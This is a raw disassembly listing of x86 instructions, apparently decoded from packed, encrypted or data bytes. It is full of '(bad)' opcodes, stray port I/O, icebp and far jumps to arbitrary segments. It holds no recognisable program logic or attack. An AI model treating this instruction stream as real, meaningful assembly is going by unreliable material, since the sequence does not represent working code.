  4059ff:	pop    ebp
  405a00:	rcr    DWORD PTR [edx-0x7be31e90],cl
  405a06:	xor    ebx,edx
  405a08:	js     0x405a34
  405a0a:	popa   
  405a0b:	test   eax,0x89d5d69d
  405a10:	inc    ebx
  405a11:	xlat   BYTE PTR ds:[ebx]
  405a12:	and    eax,0x35fba3fc
  405a17:	aam    0x38
  405a19:	push   ebp
  405a1a:	hlt    
  405a1b:	loop   0x405a17
  405a1d:	inc    eax
  405a1e:	push   edx
  405a1f:	popf   
  405a20:	sub    edx,DWORD PTR [ebp+0x41]
  405a23:	in     eax,dx
  405a24:	icebp  
  405a25:	aas    
  405a26:	scas   eax,DWORD PTR es:[edi]
  405a27:	adc    al,0x77
  405a29:	mov    esi,0xe69de110
  405a2e:	xor    edx,DWORD PTR [edx+0x31]
  405a31:	das    
  405a32:	addr16 cwde 
  405a34:	repz cmp BYTE PTR [esp+eiz*2-0x154ebfdd],ch
  405a3c:	dec    eax
  405a3d:	pop    ss
  405a3e:	fcom   DWORD PTR [edx+0x6c]
  405a41:	fild   DWORD PTR [ecx-0x3d]
  405a44:	lods   eax,DWORD PTR ds:[esi]
  405a45:	mov    ds:0x9538475f,eax
  405a4a:	fnstsw WORD PTR [ebx]
  405a4c:	cmp    ebp,ebx
  405a4e:	jle    0x405ab3
  405a50:	mov    dl,0x4e
  405a52:	mov    DWORD PTR [esp+ebp*2],eax
  405a55:	pop    edi
  405a56:	test   al,0x54
  405a58:	out    0xa0,al
  405a5a:	repz cdq 
  405a5c:	test   BYTE PTR [ebx+0x5f],dh
  405a5f:	sub    esi,DWORD PTR [edi]
  405a61:	fisubr DWORD PTR [edi]
  405a63:	mov    ds:0x57403fb3,al
  405a68:	push   ecx
  405a69:	jo     0x405a7a
  405a6b:	scas   ax,WORD PTR es:[edi]
  405a6d:	sahf   
  405a6e:	outs   dx,BYTE PTR ds:[esi]
  405a6f:	mov    eax,DWORD PTR [edx+0x1a163769]
  405a75:	loope  0x405aef
  405a77:	sahf   
  405a78:	cs push 0x78
  405a7b:	cmp    BYTE PTR [eax+0x2793e9d],bh
  405a81:	cs in  al,dx
  405a83:	xor    DWORD PTR [ebx+0x46af7b4],eax
  405a89:	loopne 0x405aed
  405a8b:	fidiv  DWORD PTR [edx-0x22c32dd8]
  405a91:	jge    0x405ab3
  405a93:	out    0x48,al
  405a95:	xchg   ebp,eax
  405a96:	cmp    ch,BYTE PTR [edx]
  405a98:	mov    ah,0x76
  405a9a:	mov    cl,0x2f
  405a9c:	(bad)  
  405a9d:	sbb    ebp,DWORD PTR [ebp+ebp*8-0x4c6160d4]
  405aa4:	push   0x70
  405aa6:	push   es
  405aa7:	add    ecx,DWORD PTR [eax]
  405aa9:	add    eax,0x1f7db74f
  405aaf:	inc    ebx
  405ab0:	icebp  
  405ab1:	cdq    
  405ab2:	test   al,0x4c
  405ab4:	adc    al,0xde
  405ab6:	mov    al,ds:0x47ae7737
  405abb:	cdq    
  405abc:	bound  ecx,QWORD PTR [edx-0x48]
  405abf:	xchg   BYTE PTR [ebx+0x7c9017e4],ch
  405ac5:	cs into 
  405ac7:	loopne 0x405b05
  405ac9:	mov    dh,BYTE PTR [edx]
  405acb:	mov    eax,ds:0xd28792a8
  405ad0:	stos   BYTE PTR es:[edi],al
  405ad1:	cmp    DWORD PTR [ebx],ebp
  405ad3:	lea    eax,[edi+0x4d]
  405ad6:	loop   0x405aab
  405ad8:	cmp    DWORD PTR [ebx+ecx*1-0xa526b4d],eax
  405adf:	(bad)  
  405ae0:	inc    esi
  405ae1:	dec    esi
  405ae2:	es pop edi
  405ae4:	pop    edi
  405ae5:	neg    DWORD PTR [eax-0x5d5f2de5]
  405aeb:	jge    0x405aa0
  405aed:	push   eax
  405aee:	cwde   
  405aef:	popa   
  405af0:	pop    ecx
  405af1:	popf   
  405af2:	or     dl,BYTE PTR [ecx]
  405af4:	pop    ebx
  405af5:	sbb    ebp,DWORD PTR [edi]
  405af7:	jg     0x405a7e
  405af9:	and    al,0xce
  405afb:	outs   dx,BYTE PTR ds:[esi]
  405afc:	call   0xffd4:0xced6a0d4
  405b03:	jp     0x405b2c
  405b05:	les    ebx,FWORD PTR [edx]
  405b07:	xor    al,0xc6
  405b09:	xchg   ebp,eax
  405b0a:	call   0x3ee4:0xb35a2378
  405b11:	retf   0x6079
  405b14:	xchg   ecx,eax
  405b15:	jbe    0x405b37
  405b17:	push   ds
  405b18:	mov    bh,0x44
  405b1a:	sub    DWORD PTR [esi+0x1edf8e0e],ebp
  405b20:	push   0xffffffb4
  405b22:	pop    edi
  405b23:	iret   
  405b24:	imul   DWORD PTR [ecx+0x17c1f586]
  405b2a:	arpl   dx,dx
  405b2c:	je     0x405ba4
  405b2e:	push   esp
  405b2f:	jno    0x405b43
  405b31:	and    al,0x9
  405b33:	ss fwait
  405b35:	sub    al,0x64
  405b37:	cli    
  405b38:	or     al,0xcb
  405b3a:	mov    al,ds:0xd4e96478
  405b3f:	pusha  
  405b40:	push   0x9baed308
  405b45:	push   esp
  405b46:	jge    0x405b22
  405b48:	inc    edi
  405b49:	leave  
  405b4a:	add    BYTE PTR [ecx-0x7c],0xcb
  405b4e:	and    eax,ecx
  405b50:	dec    edx
  405b51:	leave  
  405b52:	mov    esi,0xf28ad663
  405b57:	inc    edx
  405b58:	xor    BYTE PTR [ebx-0x1d],ch
  405b5b:	jmp    0x1aef:0xa3982945
  405b62:	stc    
  405b63:	or     BYTE PTR [edi],dh
  405b65:	popw   ss
  405b67:	jb     0x405ba2
  405b69:	push   es
  405b6a:	fidivr WORD PTR [eax+eiz*1]
  405b6d:	fcomip st,st(2)
  405b6f:	pop    ecx
  405b70:	inc    edi
  405b71:	sub    esi,esi
  405b73:	jb     0x405b21
  405b75:	fst    QWORD PTR ds:0x1e5ac6c3
  405b7b:	jecxz  0x405b15
  405b7d:	in     al,dx
  405b7e:	je     0x405bd3
  405b80:	sbb    DWORD PTR [ebx-0xd8b45b1],eax
  405b86:	jmp    0x405b90
  405b88:	imul   edi,DWORD PTR ds:0xa2b206ab,0x20
  405b8f:	dec    ebp
  405b90:	out    0xce,eax
  405b92:	test   BYTE PTR [edi],0xb4
  405b95:	lea    edx,[esi+0x64]
  405b98:	xchg   ecx,eax
  405b99:	add    al,BYTE PTR [esi]
  405b9b:	xchg   edi,eax
  405b9c:	xchg   DWORD PTR [edi-0x17],esi
  405b9f:	div    eax
  405ba1:	(bad)  
  405ba2:	popa   
  405ba3:	aam    0x75
  405ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ba6:	add    DWORD PTR [edx],ebx
  405ba8:	neg    bl
  405baa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bab:	cdq    
  405bac:	and    dh,BYTE PTR [edx+0x7b]
  405baf:	cwde   
  405bb0:	call   0x12a69e76
  405bb5:	and    al,0xc
  405bb7:	xor    al,0x89
  405bb9:	cmp    eax,0xcd677ff9
  405bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bbf:	pop    ebp
  405bc0:	and    eax,0xcf296769
  405bc5:	shl    DWORD PTR [ebp+0x2fac9495],1
  405bcb:	int3   
  405bcc:	xor    BYTE PTR [ecx-0x4909cd3e],al
  405bd2:	sub    DWORD PTR ss:[ecx],ebp
  405bd5:	and    DWORD PTR [eax+0x72],edi
  405bd8:	jecxz  0x405c51
  405bda:	clc    
  405bdb:	sbb    ebx,eax
  405bdd:	test   BYTE PTR [edi],cl
  405bdf:	lods   eax,DWORD PTR ds:[esi]
  405be0:	icebp  
  405be1:	pop    ebx
  405be2:	jb     0x405bbb
  405be4:	and    bl,BYTE PTR [edx+0x7d]
  405be7:	inc    edx
  405be8:	dec    edx
  405be9:	or     ebp,DWORD PTR [ecx-0x37]
  405bec:	adc    eax,DWORD PTR [ecx+0xb]
  405bef:	(bad)  
  405bf1:	aas    
  405bf2:	cdq    
  405bf3:	int    0x9b
  405bf5:	test   BYTE PTR [edi+eax*2+0x2c05e4ac],ah
  405bfc:	and    ecx,DWORD PTR ds:[edi+ebp*2+0x2b]
  405c01:	xchg   esi,eax
  405c02:	sbb    DWORD PTR [esi+eax*1],edx
  405c05:	pop    ebx
  405c06:	dec    edi
  405c07:	out    0xe5,eax
  405c09:	cmp    ch,BYTE PTR [eax]
  405c0b:	push   ds
  405c0c:	mov    bh,0x45
  405c0e:	(bad)  [ebx]
  405c10:	aas    
  405c11:	jns    0x405c31
  405c13:	jecxz  0x405c08
  405c15:	xchg   DWORD PTR ds:0xc63d4af2,ebx
  405c1b:	stc    
  405c1c:	mov    ecx,0x5455ef58
  405c21:	out    dx,al
  405c22:	inc    edi
  405c23:	ret    0x230d
  405c26:	adc    ebp,DWORD PTR [eax-0x30c6ba72]
  405c2c:	fucom  st(3)
  405c2e:	inc    eax
  405c2f:	fcmovnu st,st(0)
  405c31:	les    cx,DWORD PTR [ebx+0x61377ff3]
  405c38:	mov    edx,0xecf6291c
  405c3d:	cmp    eax,0x557f9a23
  405c42:	pop    ds
  405c43:	js     0x405c74
  405c45:	xchg   esp,eax
  405c46:	mov    cl,0x8e
  405c48:	pop    ds
  405c49:	xchg   ebx,eax
  405c4a:	dec    esp
  405c4b:	mov    al,ds:0x2807d188
  405c50:	xlat   BYTE PTR ds:[ebx]
  405c51:	mov    bl,0xd8
  405c53:	fwait
  405c54:	lock hlt 
  405c56:	dec    ebp
  405c57:	clc    
  405c58:	in     eax,dx
  405c59:	or     BYTE PTR ds:0x8f20505b,al
  405c5f:	xchg   ecx,eax
  405c60:	pop    esp
  405c61:	imul   DWORD PTR [esi]
  405c63:	xchg   ebp,eax
  405c64:	repz dec edx
  405c66:	(bad)  
  405c67:	mov    esp,?
  405c69:	xchg   esp,eax
  405c6a:	vmulpd xmm7,xmm2,XMMWORD PTR [esi+0x6e27e5f1]
  405c72:	add    ebx,DWORD PTR ds:0xb68bb58f
  405c78:	mov    ds:0xd27846d1,eax
  405c7d:	addr16 xor eax,0x8dea5705
  405c83:	add    dl,BYTE PTR [edx+0x745e3a1e]
  405c89:	xchg   BYTE PTR [eax-0xa],bh
  405c8c:	enter  0x6c6c,0x29
  405c90:	adc    esi,ebp
  405c92:	mov    DWORD PTR [edi+0x311e32f],0xb305c772
  405c9c:	and    al,0xb2
  405c9e:	and    ch,0x80
  405ca1:	mov    cl,0x7e
  405ca3:	cmp    DWORD PTR [edi],0xffffffad
  405ca6:	jl     0x405cc2
  405ca8:	pop    ecx
  405ca9:	sub    al,0xf8
  405cab:	fidivr WORD PTR [edx-0x5f5de58a]
  405cb1:	out    dx,eax
  405cb2:	dec    esi
  405cb3:	xor    al,BYTE PTR ds:0x43275136
  405cb9:	pop    edx
  405cba:	xor    BYTE PTR [ecx+0x4f],0xc2
  405cbe:	jle    0x405c52
  405cc0:	or     bh,0x7
  405cc3:	mov    esp,DWORD PTR [esi]
  405cc5:	cli    
  405cc6:	inc    ebx
  405cc7:	int3   
  405cc8:	sti    
  405cc9:	add    ch,BYTE PTR [ecx]
  405ccb:	int    0xd8
  405ccd:	retf   
  405cce:	sub    BYTE PTR [edi-0x49973925],bl
  405cd4:	jle    0x405d0d
  405cd6:	inc    edi
  405cd7:	adc    BYTE PTR [eax],ah
  405cd9:	hlt    
  405cda:	arpl   WORD PTR [edi+0x2a],dx
  405cdd:	mov    al,ds:0x2c7b1429
  405ce2:	mov    ds:0x139e43ce,al
  405ce7:	(bad)  
  405ce8:	pop    esi
  405ce9:	clc    
  405cea:	jae    0x405cd4
  405cec:	or     eax,0x1445b1a9
  405cf1:	inc    esp
  405cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cf3:	sbb    eax,0xe9e6ea81
  405cf8:	xchg   esp,eax
  405cf9:	pusha  
  405cfa:	mov    cl,0x99
  405cfc:	jmp    0x64670d88
  405d01:	stc    
  405d02:	stos   DWORD PTR es:[edi],eax
  405d03:	ins    BYTE PTR es:[edi],dx
  405d04:	mov    cl,BYTE PTR [ecx+0x46]
  405d07:	jecxz  0x405d56
  405d09:	xlat   BYTE PTR ds:[ebx]
  405d0a:	fsub   st,st(3)
  405d0c:	add    BYTE PTR [esi],dl
  405d0e:	fwait
  405d0f:	push   ss
  405d10:	jmp    0x405cb5
  405d12:	nop
  405d13:	test   bl,al
  405d15:	pop    DWORD PTR [eax]
  405d17:	test   edx,edi
  405d19:	cmp    eax,0xd0378c7f
  405d1e:	xor    BYTE PTR [ebp+0x70],al
  405d21:	shl    BYTE PTR ds:0xfa4f5d68,cl
  405d27:	aas    
  405d28:	xlat   BYTE PTR ds:[ebx]
  405d29:	mov    cl,0xf0
  405d2b:	(bad)  
  405d2c:	shl    BYTE PTR [eax+esi*8],cl
  405d2f:	shl    DWORD PTR [edi],1
  405d31:	fisubr WORD PTR [ecx+0x3]
  405d34:	jp     0x405d31
  405d36:	ds out dx,al
  405d38:	push   ss
  405d39:	mov    ch,BYTE PTR ds:0x3968bd18
  405d3f:	pusha  
  405d40:	cmp    DWORD PTR [eax+0x4b774fe5],ebp
  405d46:	ss loope 0x405d43
  405d49:	cmp    bl,BYTE PTR [edx-0x7cc1227a]
  405d4f:	or     al,0x99
  405d51:	popa   
  405d52:	adc    al,0x30
  405d54:	icebp  
  405d55:	dec    ebp
  405d56:	js     0x405d91
  405d58:	out    dx,eax
  405d59:	and    BYTE PTR [ebp+0x3fa1feb1],al
  405d5f:	lock add cl,dh
  405d62:	scas   al,BYTE PTR es:[edi]
  405d63:	cmp    BYTE PTR [esi],dl
  405d65:	je     0x405d45
  405d67:	push   esp
  405d68:	sub    eax,0x4c016080
  405d6d:	push   ss
  405d6e:	je     0x405dee
  405d70:	fcmovbe st,st(0)
  405d72:	xor    bh,BYTE PTR cs:[ecx-0x7a]
  405d76:	int    0x41
  405d78:	push   es
  405d79:	dec    edi
  405d7a:	icebp  
  405d7b:	inc    ebx
  405d7c:	pop    ds
  405d7d:	lds    eax,FWORD PTR ds:0x125ed260
  405d83:	or     esp,ebp
  405d85:	mov    bh,0x9d
  405d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d88:	adc    ecx,esp
  405d8a:	ss aad 0x7d
  405d8d:	pop    edi
  405d8e:	add    edi,DWORD PTR [ecx+0x61e2b8fa]
  405d94:	loop   0x405dcf
  405d96:	xlat   BYTE PTR ds:[ebx]
  405d97:	push   edi
  405d98:	jmp    0x405d3f
  405d9a:	xchg   esi,eax
  405d9b:	push   0x67
  405d9d:	xchg   DWORD PTR [ecx+0x7f475e09],eax
  405da3:	test   eax,0x5e531d66
  405da8:	cmp    cl,0x8
  405dab:	push   esp
  405dac:	(bad)  
  405dad:	out    0xfc,al
  405daf:	add    al,ah
  405db1:	(bad)  
  405db2:	cmp    al,0x59
  405db4:	sub    BYTE PTR [ecx+eax*1],cl
  405db7:	inc    esi
  405db8:	(bad)  
  405db9:	fbstp  TBYTE PTR [ebp+esi*2+0x1]
  405dbd:	xchg   edx,eax
  405dbe:	dec    eax
  405dbf:	mov    edi,0x31793f71
  405dc4:	or     DWORD PTR [ebx],esp
  405dc6:	je     0x405dad
  405dc8:	retf   
  405dc9:	push   edx
  405dca:	push   ss
  405dcb:	cmp    ah,bh
  405dcd:	ss loop 0x405e03
  405dd0:	data16 and BYTE PTR [esi-0x49182481],0x77
  405dd8:	jge    0x405e37
  405dda:	sub    edi,DWORD PTR [edi]
  405ddc:	push   ecx
  405ddd:	pop    ebp
  405dde:	sbb    ebp,edi
  405de0:	lds    edx,FWORD PTR [ecx+0x36]
  405de3:	dec    ecx
  405de4:	test   al,0x5c
  405de6:	add    cl,BYTE PTR [esi+0x6bfe93dd]
  405dec:	jecxz  0x405d93
  405dee:	or     BYTE PTR [edx+0xf],ah
  405df1:	jns    0x405e67
  405df3:	shr    DWORD PTR [edi+edi*1],0x6f
  405df7:	aad    0x6f
  405df9:	inc    esp
  405dfa:	sbb    BYTE PTR [esi],0x75
  405dfd:	mov    esp,0xfff107b
  405e02:	pop    eax
  405e03:	inc    esp
  405e04:	pop    edx
  405e05:	jl     0x405e5d
  405e07:	mov    al,0xf8
  405e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e0a:	mov    ds:0x2f21e694,eax
  405e0f:	jmp    0x3e8b:0x7f58ab0f
  405e16:	xchg   esi,eax
  405e17:	bound  edx,QWORD PTR [edx]
  405e19:	int3   
  405e1a:	pop    ds
  405e1b:	imul   ebx,DWORD PTR [edx],0xa014e35f
  405e21:	loop   0x405dc1
  405e23:	int3   
  405e24:	xchg   edx,eax
  405e25:	std    
  405e26:	xchg   edx,eax
  405e27:	in     al,dx
  405e28:	mov    ebx,0x60802abb
  405e2d:	jae    0x405db7
  405e2f:	daa    
  405e30:	mov    cl,ah
  405e32:	lea    esi,ds:0xe19bbdc4
  405e38:	push   es
  405e39:	jmp    0xdc40:0x980fc726
  405e40:	push   es
  405e41:	mov    cl,0xf3
  405e43:	xchg   edi,eax
  405e44:	sub    bh,BYTE PTR [esi-0x9bb2428]
  405e4a:	sub    BYTE PTR [edi-0x68],0xfd
  405e4e:	stc    
  405e4f:	out    0xf,al
  405e51:	push   0xfb4ea161
  405e56:	aam    0x78
  405e58:	dec    ebx
  405e59:	cmp    esp,ebx
  405e5b:	adc    BYTE PTR [ebx+edi*2+0x44],bl
  405e5f:	cmp    al,0x8a
  405e61:	daa    
  405e62:	sbb    al,0xc2
  405e64:	push   edx
  405e65:	jne    0x405e47
  405e67:	repz mov edx,0xe9d1d65f
  405e6d:	sub    cl,BYTE PTR ds:[esi]
  405e70:	in     eax,dx
  405e71:	push   edx
  405e72:	retf   
  405e73:	jns    0x405e3e
  405e75:	int3   
  405e76:	repnz mov ebx,0x94f4374
  405e7c:	inc    eax
  405e7d:	out    dx,al
  405e7e:	mov    eax,ds:0x345a6c3b
  405e83:	push   edi
  405e84:	add    DWORD PTR [ecx],0x1f028605
  405e8a:	outs   dx,DWORD PTR ds:[esi]
  405e8b:	leave  
  405e8c:	out    dx,al
  405e8d:	dec    eax
  405e8e:	sub    al,0x88
  405e90:	sub    BYTE PTR [edi-0x6c],dh
  405e93:	pop    esp
  405e94:	mov    al,0x63
  405e96:	inc    edx
  405e97:	or     BYTE PTR [ebx+0x2a],0xe4
  405e9b:	imul   edi,DWORD PTR [edi-0x2145dc38],0x29
  405ea2:	inc    edx
  405ea3:	sub    dh,al
  405ea5:	or     al,0xee
  405ea7:	xor    BYTE PTR [edi],al
  405ea9:	inc    edi
  405eaa:	neg    BYTE PTR [ebp+0x5f18e2de]
  405eb0:	pop    ebp
  405eb1:	cmc    
  405eb2:	or     ebp,DWORD PTR [ecx+0x6c1fc585]
  405eb8:	pop    edi
  405eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eba:	out    dx,al
  405ebb:	adc    BYTE PTR [ecx],cl
  405ebd:	xor    DWORD PTR [edx],esi
  405ebf:	push   ebp
  405ec0:	mov    bl,0x1
  405ec2:	shl    DWORD PTR [ebx-0x54746edb],1
  405ec8:	mov    ah,0xc0
  405eca:	(bad)  
  405ecb:	in     al,dx
  405ecc:	pop    es
  405ecd:	push   esp
  405ece:	dec    esi
  405ecf:	xchg   ecx,eax
  405ed0:	les    ebx,FWORD PTR [ecx+0x35]
  405ed3:	sahf   
  405ed4:	dec    edx
  405ed5:	sbb    eax,0xe1e73c50
  405eda:	aad    0xb5
  405edc:	call   0x49477db5
  405ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee2:	daa    
  405ee3:	ret    
  405ee4:	cmp    al,0x2d
  405ee6:	adc    DWORD PTR [ebx],0x2793feb2
  405eec:	sahf   
  405eed:	pop    edi
  405eee:	out    0x72,eax
  405ef0:	repz cmp eax,DWORD PTR [edi+0x64]
  405ef4:	sbb    eax,0xf8873a3e
  405ef9:	push   ebx
  405efa:	xchg   ecx,eax
  405efb:	jge    0x405f45
  405efd:	(bad)  [esi-0x26]
  405f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f01:	jno    0x405f26
  405f03:	repnz fdivr DWORD PTR [esi]
  405f06:	fwait
  405f07:	dec    esi
  405f08:	pop    ebp
  405f09:	adc    eax,0x3f44abac
  405f0e:	retf   0x5a2c
  405f11:	(bad)  
  405f12:	popf   
  405f13:	lock outs dx,BYTE PTR ds:[esi]
  405f15:	cmp    eax,0x563b01c8
  405f1a:	mov    al,ds:0x5806f1ad
  405f1f:	outs   dx,BYTE PTR ds:[esi]
  405f20:	xor    eax,0x3ac75850
  405f25:	inc    edx
  405f26:	(bad)  
  405f28:	and    BYTE PTR [eax+0x4172fceb],dh
  405f2e:	or     edi,DWORD PTR [esi+0x493e2b66]
  405f34:	xchg   DWORD PTR [ebp+0x32],eax
  405f37:	xchg   esp,eax
  405f38:	clc    
  405f39:	xchg   esp,eax
  405f3a:	mov    ebx,0xd23ff0dc
  405f3f:	dec    edi
  405f40:	cmp    DWORD PTR [ebp+0x68237321],0x986eaf9b
  405f4a:	shl    BYTE PTR [eax+0x57],0xeb
  405f4e:	stos   DWORD PTR es:[edi],eax
  405f4f:	and    al,0xc4
  405f51:	stc    
  405f52:	cld    
  405f53:	xchg   edx,eax
  405f54:	stos   BYTE PTR es:[edi],al
  405f55:	loopne 0x405fbf
  405f57:	popa   
  405f58:	inc    ecx
  405f59:	lods   al,BYTE PTR ds:[esi]
  405f5a:	lock dec edi
  405f5c:	icebp  
  405f5d:	lock outs dx,BYTE PTR ds:[esi]
  405f5f:	addr16 push ebp
  405f61:	cld    
  405f62:	cdq    
  405f63:	loopne 0x405f60
  405f65:	xchg   esi,eax
  405f66:	sbb    BYTE PTR [edi-0x64a07c13],0xa3
  405f6d:	test   eax,esi
  405f6f:	out    dx,eax
  405f70:	retf   0xbccc
  405f73:	cmp    eax,0x961709e
  405f78:	mov    dh,0x4c
  405f7a:	cwde   
  405f7b:	jp     0x405f52
  405f7d:	mov    dl,0xb2
  405f7f:	loop   0x405f14
  405f81:	xor    esp,DWORD PTR [edi-0x77ab156e]
  405f87:	sbb    ecx,ebp
  405f89:	xchg   BYTE PTR [ecx+0x751557e7],bh
  405f8f:	push   cs
  405f90:	test   al,0xa2
  405f92:	ds cmp al,0x2a
  405f95:	enter  0x5176,0xeb
  405f99:	cmp    ecx,eax
  405f9b:	add    DWORD PTR [edi],edi
  405f9d:	sub    eax,esp
  405f9f:	pop    esi
  405fa0:	pop    ebx
  405fa1:	retf   
  405fa2:	jecxz  0x405f5d
  405fa4:	and    BYTE PTR [eax+0x4bfa1cac],bl
  405faa:	jle    0x40601a
  405fac:	dec    esp
  405fad:	mov    edx,0x5fc94b01
  405fb2:	ins    DWORD PTR es:[edi],dx
  405fb3:	xchg   edi,eax
  405fb4:	or     eax,DWORD PTR [esi+0x59]
  405fb7:	into   
  405fb8:	inc    ecx
  405fb9:	cwde   
  405fba:	int3   
  405fbb:	mov    dl,0x85
  405fbd:	mov    esi,ecx
  405fbf:	in     eax,dx
  405fc0:	sub    bh,BYTE PTR [ecx+0x63]
  405fc3:	clc    
  405fc4:	jae    0x405f6a
  405fc6:	imul   BYTE PTR ds:0xeb1e2c84
  405fcc:	mov    ds:0xaaae6521,al
  405fd1:	mov    bl,0xd3
  405fd3:	in     eax,0x13
  405fd5:	mov    al,BYTE PTR ds:0xdedfe5e9
  405fdb:	packuswb mm2,QWORD PTR [ecx-0x67f9df75]
  405fe2:	jmp    0x4113:0x6138f067
  405fe9:	adc    eax,0x7fa914b0
  405fee:	push   edx
  405fef:	sbb    dl,BYTE PTR ds:0xc64d5b74
  405ff5:	retf   
  405ff6:	sbb    eax,0x43708aac
  405ffb:	and    eax,0x757d2a00
  406000:	inc    ecx
  406001:	ret    0xf28a
  406004:	mov    al,ds:0x2dd2e507
  406009:	(bad)  
  40600a:	dec    esp
  40600b:	mov    DWORD PTR [eax-0x129bcc45],ebp
  406011:	popa   
  406012:	jle    0x406007
  406014:	ins    BYTE PTR es:[edi],dx
  406015:	mov    dh,0xb8
  406017:	fidivr DWORD PTR [ecx-0x5747361f]
  40601d:	cld    
  40601e:	push   es
  40601f:	push   edi
  406020:	add    DWORD PTR [ebx+0x2f6ca593],ecx
  406026:	rcr    BYTE PTR [edi+edx*8+0x71f50a80],cl
  40602d:	out    0xe8,al
  40602f:	retf   
  406030:	jnp    0x405fd8
  406032:	fisub  WORD PTR [edi]
  406034:	cli    
  406035:	inc    esp
  406036:	out    0xc7,al
  406038:	lods   eax,DWORD PTR ds:[esi]
  406039:	stc    
  40603a:	loopne 0x40600a
  40603c:	arpl   WORD PTR [ecx],cx
  40603e:	add    al,0x65
  406040:	test   DWORD PTR [ecx],edi
  406042:	dec    edx
  406043:	stos   BYTE PTR es:[edi],al
  406044:	js     0x406041
  406046:	and    eax,0x134bfd68
  40604b:	jae    0x406088
  40604d:	aad    0x25
  40604f:	cld    
  406050:	mul    DWORD PTR [esi+edx*1]
  406053:	mov    DWORD PTR [eax],eax
  406055:	jno    0x4060c1
  406057:	pop    ebx
  406058:	adc    dl,BYTE PTR [edi-0x2c]
  40605b:	pop    ds
  40605c:	pop    edi
  40605d:	fdivrp st(2),st
  40605f:	pop    esp
  406060:	cmp    BYTE PTR [esi+0x79],0x9f
  406064:	or     DWORD PTR [eax],esi
  406066:	push   ebx
  406067:	clc    
  406068:	jmp    0x405ff9
  40606a:	adc    al,BYTE PTR [ebp+ebp*4-0x6b]
  40606e:	xchg   esi,eax
  40606f:	adc    dl,BYTE PTR [ecx+ecx*4]
  406072:	or     BYTE PTR [ecx+edi*4+0x56],dh
  406076:	icebp  
  406077:	fs sahf 
  406079:	add    BYTE PTR [ecx+0x37a5f4c3],dh
  40607f:	stos   BYTE PTR es:[edi],al
  406080:	push   ecx
  406081:	enter  0x61fb,0x6e
  406085:	js     0x406097
  406087:	fcmovnb st,st(7)
  406089:	daa    
  40608a:	shl    BYTE PTR ds:0x5e3d35a9,1
  406090:	and    al,0x1c
  406092:	jge    0x406014
  406094:	sub    al,0x38
  406096:	sbb    BYTE PTR [ebp-0x69f3a344],ah
  40609c:	cmp    BYTE PTR [edi],bl
  40609e:	adc    BYTE PTR es:[edi],cl
  4060a1:	pop    eax
  4060a2:	mov    al,ds:0x237817b3
  4060a7:	scas   al,BYTE PTR es:[edi]
  4060a8:	std    
  4060a9:	fimul  DWORD PTR [ecx]
  4060ab:	shr    edi,1
  4060ad:	pop    edi
  4060ae:	push   eax
  4060af:	push   ebp
  4060b0:	or     BYTE PTR [ebx+0x15],dh
  4060b3:	loop   0x406047
  4060b5:	or     bl,al
  4060b7:	int    0x7e
  4060b9:	mov    ch,0x4f
  4060bb:	test   al,0x22
  4060bd:	arpl   WORD PTR [edx-0x1d258cf8],cx
  4060c3:	jmp    0xa15b:0x683bd3ba
  4060ca:	mov    esp,?
  4060cc:	pusha  
  4060cd:	(bad)  
  4060ce:	gs mov al,0xb
  4060d1:	inc    eax
  4060d2:	push   esi
  4060d3:	mov    ds:0x8d0b76a1,eax
  4060d8:	xor    al,BYTE PTR [esi+esi*4]
  4060db:	jecxz  0x406066
  4060dd:	sub    DWORD PTR [ecx+ebx*4+0x6e],0xffffffe9
  4060e2:	push   esp
  4060e3:	pop    ecx
  4060e4:	inc    ebp
  4060e5:	cli    
  4060e6:	retf   0x9481
  4060e9:	add    BYTE PTR [esi],dh
  4060eb:	push   0x8f1feef5
  4060f0:	in     eax,dx
  4060f1:	sbb    al,0x24
  4060f3:	pop    ecx
  4060f4:	mov    ecx,esp
  4060f6:	test   al,0x79
  4060f8:	jg     0x406159
  4060fa:	cmp    eax,0x5f216982
  4060ff:	scas   al,BYTE PTR es:[edi]
  406100:	loop   0x40609a
  406102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406103:	dec    bx
  406105:	lds    ecx,FWORD PTR [esp+edx*1-0x1b9e9846]
  40610c:	mov    bh,0xdb
  40610e:	shl    BYTE PTR [ecx+ebx*8],1
  406111:	(bad)  
  406112:	jmp    0xc8fec2f5
  406117:	pop    ebx
  406118:	popa   
  406119:	mov    eax,ds:0x3e31c385
  40611e:	in     eax,dx
  40611f:	ss adc ch,dh
  406122:	mov    ds:0xfbe8222b,al
  406127:	int    0xce
  406129:	mov    ah,0xd1
  40612b:	mov    esp,0xca11e0ee
  406130:	fucomp st(1)
  406132:	jge    0x4060d5
  406134:	fadd   DWORD PTR [ebx+0x2f]
  406137:	pushf  
  406138:	and    eax,0x7609d371
  40613d:	sbb    eax,0xe01f4036
  406142:	imul   esi,ebp,0x5c
  406145:	sbb    BYTE PTR [ecx-0x65f0ff8f],bl
  40614b:	or     al,0x31
  40614d:	adc    al,0x1d
  40614f:	nop
  406150:	rcr    esi,0x1
  406153:	mov    eax,ds:0x48c6f46f
  406158:	mov    esp,0x354d31f5
  40615d:	out    0xf,eax
  40615f:	add    al,0x24
  406161:	inc    eax
  406162:	rcl    BYTE PTR [edx+0x56950699],0x92
  406169:	or     al,0x2d
  40616b:	push   0x2ff80985
  406170:	jns    0x406199
  406172:	add    ch,BYTE PTR [eax]
  406174:	ins    BYTE PTR es:[edi],dx
  406175:	or     BYTE PTR [eax-0x54],dl
  406178:	call   0xf6375a97
  40617d:	jo     0x406184
  40617f:	mov    eax,0xcafc2b57
  406184:	mov    bl,0xeb
  406186:	sar    BYTE PTR [ecx-0x2b],cl
  406189:	das    
  40618a:	xor    al,0xf2
  40618c:	icebp  
  40618d:	xor    ecx,DWORD PTR [eax+0xfdf1594]
  406193:	jecxz  0x40617a
  406195:	fxch   st(2)
  406197:	or     DWORD PTR [ecx+0x2c],0x7946c7a0
  40619e:	adc    eax,0xb9b70b6d
  4061a3:	xchg   BYTE PTR [ecx],al
  4061a5:	dec    eax
